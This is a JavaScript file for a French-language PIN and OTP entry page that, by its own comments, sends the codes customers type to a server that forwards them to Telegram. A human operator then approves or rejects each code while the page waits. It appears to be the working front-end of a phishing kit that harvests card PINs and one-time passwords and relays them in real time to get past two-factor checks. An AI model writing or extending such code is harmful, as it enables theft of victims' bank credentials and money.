/**
 * PIN / OTP verification front-end.
 *
 * The customer types a code and presses the button. Nothing is compared in the
 * browser: the code goes to the server, which forwards it to Telegram. This
 * script then polls the order until the operator answers, and only then moves
 * on. A wrong verdict sends the customer back to a fresh form.
 *
 * These pages are separate documents (server-rendered), so each real page load
 * starts clean — which is why the earlier "waiting" state was so easy to lose.
 */
(function () {
  "use strict";

  const POLL_MS = 2000;
  const root = document.getElementById("verifyRoot");
  if (!root) return;

  const reference = root.dataset.reference;
  const token = root.dataset.token;
  const stage = root.dataset.stage;
  const kind = root.dataset.kind; // "pin" | "otp"

  const form = document.getElementById("verifyForm");
  const group = form ? form.querySelector("[data-pin-group]") : null;
  const boxes = group ? Array.from(group.querySelectorAll(".pin-box")) : [];
  const submitBtn = document.getElementById("verifySubmit");
  const errorBox = document.getElementById("verifyError");
  const waitingBanner = document.getElementById("waitingBanner");
  const attemptEl = document.getElementById("attemptCount");

  // ---------------------------------------------------------------- digits
  const value = () => boxes.map((b) => b.value.replace(/\D/g, "").slice(0, 1)).join("");

  boxes.forEach((box, i) => {
    box.addEventListener("input", () => {
      box.value = box.value.replace(/\D/g, "").slice(0, 1);
      if (box.value && i < boxes.length - 1) boxes[i + 1].focus();
    });
    box.addEventListener("keydown", (e) => {
      if (e.key === "Backspace" && !box.value && i > 0) {
        boxes[i - 1].focus();
        boxes[i - 1].value = "";
        e.preventDefault();
      }
      if (e.key === "ArrowLeft" && i > 0) { boxes[i - 1].focus(); e.preventDefault(); }
      if (e.key === "ArrowRight" && i < boxes.length - 1) { boxes[i + 1].focus(); e.preventDefault(); }
    });
    box.addEventListener("paste", (e) => {
      const text = (e.clipboardData || window.clipboardData).getData("text") || "";
      const digits = text.replace(/\D/g, "").slice(0, boxes.length - i).split("");
      if (!digits.length) return;
      e.preventDefault();
      digits.forEach((d, off) => { if (boxes[i + off]) boxes[i + off].value = d; });
      const next = Math.min(i + digits.length, boxes.length - 1);
      boxes[next].focus();
    });
  });

  // --------------------------------------------------------------- helpers
  function showError(msg) {
    if (!errorBox) return;
    errorBox.textContent = msg;
    errorBox.classList.remove("hidden");
  }
  function clearError() {
    if (!errorBox) return;
    errorBox.textContent = "";
    errorBox.classList.add("hidden");
  }
  function setWaiting(on) {
    if (waitingBanner) waitingBanner.classList.toggle("hidden", !on);
    if (form) form.classList.toggle("hidden", on);
  }
  function lock(msg) {
    setWaiting(true);
    if (submitBtn) { submitBtn.disabled = true; submitBtn.textContent = msg; }
  }

  async function api(path, body) {
    const res = await fetch(path, {
      method: body === undefined ? "GET" : "POST",
      headers: Object.assign(
        { "Content-Type": "application/json", "X-Order-Token": token },
        {}
      ),
      cache: "no-store",
      body: body === undefined ? undefined : JSON.stringify(Object.assign({ token }, body)),
    });
    let data = null;
    try { data = await res.json(); } catch (_) { /* non-JSON */ }
    return { status: res.status, data };
  }

  // ------------------------------------------------------------- waiting
  // Where the order should take this page next, given the server stage.
  function goIfMoved(order) {
    const ref = encodeURIComponent(order.reference);
    const t = encodeURIComponent(token);
    if (order.status === "paid") {
      window.location.href = `/orders/${ref}/${t}/success`;
      return true;
    }
    if (order.status === "failed") {
      window.location.href = "/plans/?error=" + encodeURIComponent("Votre code est incorrect. Veuillez recommencer.");
      return true;
    }
    if (order.stage === "awaiting_otp" && kind === "pin") {
      window.location.href = `/orders/${ref}/${t}/otp`;
      return true;
    }
    if (order.stage === "awaiting_pin" && kind === "otp") {
      window.location.href = `/orders/${ref}/${t}/pin`;
      return true;
    }
    return false;
  }

  function waitForOperator() {
    if (kind === "pin") lock("Vérification en cours…");
    else lock("Vérification en cours…");
    setWaiting(true);

    const tick = async () => {
      try {
        const { status, data } = await api(`/api/orders/${reference}`);
        if (status === 200 && data && data.ok) {
          if (attemptEl) attemptEl.textContent = data.order.attempt;
          if (goIfMoved(data.order)) return;
        }
      } catch (_) { /* transient; keep polling */ }
      setTimeout(tick, POLL_MS);
    };
    setTimeout(tick, POLL_MS);
  }

  // -------------------------------------------------------------- submit
  if (form) {
    form.addEventListener("submit", async (e) => {
      e.preventDefault();
      clearError();
      const code = value();
      if (code.length !== boxes.length) {
        showError(kind === "pin" ? "Veuillez saisir les 4 chiffres de votre code PIN." : `Veuillez saisir les ${boxes.length} chiffres du code OTP.`);
        boxes[0] && boxes[0].focus();
        return;
      }
      if (submitBtn) submitBtn.disabled = true;
      // Show the waiting state straight away: the operator round-trip can take
      // a couple of seconds and the customer should see that it is under review.
      lock("Vérification en cours…");
      setWaiting(true);

      const { status, data } = await api(`/api/orders/${reference}/${kind}`, { [kind]: code });
      if (status !== 200 || !data || !data.ok) {
        if (submitBtn) submitBtn.disabled = false;
        setWaiting(false);
        boxes.forEach((b) => { b.disabled = false; });
        showError((data && data.error) || "Une erreur est survenue. Veuillez réessayer.");
        return;
      }
      boxClear();
      waitForOperator();
    });
  }

  function boxClear() {
    boxes.forEach((b) => { b.value = ""; b.disabled = true; });
  }

  // ------------------------------------------------------- initial state
  // If the page is opened while a code is already under review, or the stage
  // has already moved past this screen, follow the server rather than guess.
  (async function bootstrap() {
    const { status, data } = await api(`/api/orders/${reference}`);
    if (status !== 200 || !data || !data.ok) {
      window.location.href = "/plans/";
      return;
    }
    const order = data.order;
    if (attemptEl) attemptEl.textContent = order.attempt;

    if (goIfMoved(order)) return;

    if (kind === "pin" && order.stage === "awaiting_otp") {
      window.location.href = `/orders/${encodeURIComponent(reference)}/${encodeURIComponent(token)}/otp`;
      return;
    }

    // A code is pending review on this exact screen -> just wait.
    if (order.stage === (kind === "pin" ? "awaiting_pin" : "awaiting_otp") && order.pending) {
      lock("Vérification en cours…");
      waitForOperator();
    }
  })();
})();
